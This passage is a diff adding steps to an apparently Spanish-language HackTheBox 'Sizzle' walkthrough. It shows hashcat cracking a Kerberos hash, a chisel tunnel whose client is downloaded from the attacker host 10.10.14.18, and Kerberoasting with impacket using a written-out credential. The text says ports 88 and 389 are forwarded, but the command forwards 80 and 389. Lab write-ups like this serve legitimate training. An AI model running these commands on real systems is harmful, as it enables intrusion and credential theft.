@@ -314,6 +314,43 @@ Ejecutamos el comando con nuestras credenciales de 'amanda' y descubrimos que el
 
 ![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/9278314e-14af-4d22-830a-8819a6182718)
 
+Este hash es crackeable con 'Hashcat', con el método 13100:
+
+    └─# hashcat -m 13100 -a 0 mrlky.hash /usr/share/wordlists/rockyou.txt
+
+Obtenemos la contraseña en texto claro:
+
+![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/aed69e64-78ee-4fcb-b41f-e80d37c6bb26)
+
+### Puerto 88 - Kerberos
+
+Si volvemos a nuestro escaneo nmap, veremos que el puerto 88 - Kerberos no aparece, cuando debería aparecer ya que es un Domain Controller.
+
+Lo que podemos hacer para llegar al puerto 88 desde nuestro local, es un 'Remote Port Forwarding' para traernos el puerto 88 de la máquina a nuestro local. 
+
+Ejecutamos el servidor chisel en nuestro Kali local:
+
+    └─# chisel server -reverse -p 1234
+
+Subimos el cliente 'chisel' a la máquina Windows:
+
+    iwr -uri http://10.10.14.18/chisel.exe -OutFile chisel.exe
+
+Nos conectamos a nuestro Kali local y nos llevamos los puertos 88 y 389 para que funcione correctamente:
+
+    .\chisel client 10.10.14.18:1234 R:80:127.0.0.1:80 R:389:127.0.0.1:389
+
+Recibimos la conexión y los dos puertos:
+
+![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/a64a89e0-3d5c-430d-8a53-b142b393a25c)
+
+Y ejecutamos el Kerberoasting desde nuestro local:
+
+    └─# impacket-GetUserSPNs htb.local/amanda:Ashare1972 -request -dc-ip 127.0.0.1
+
+
+
+
 
 
 
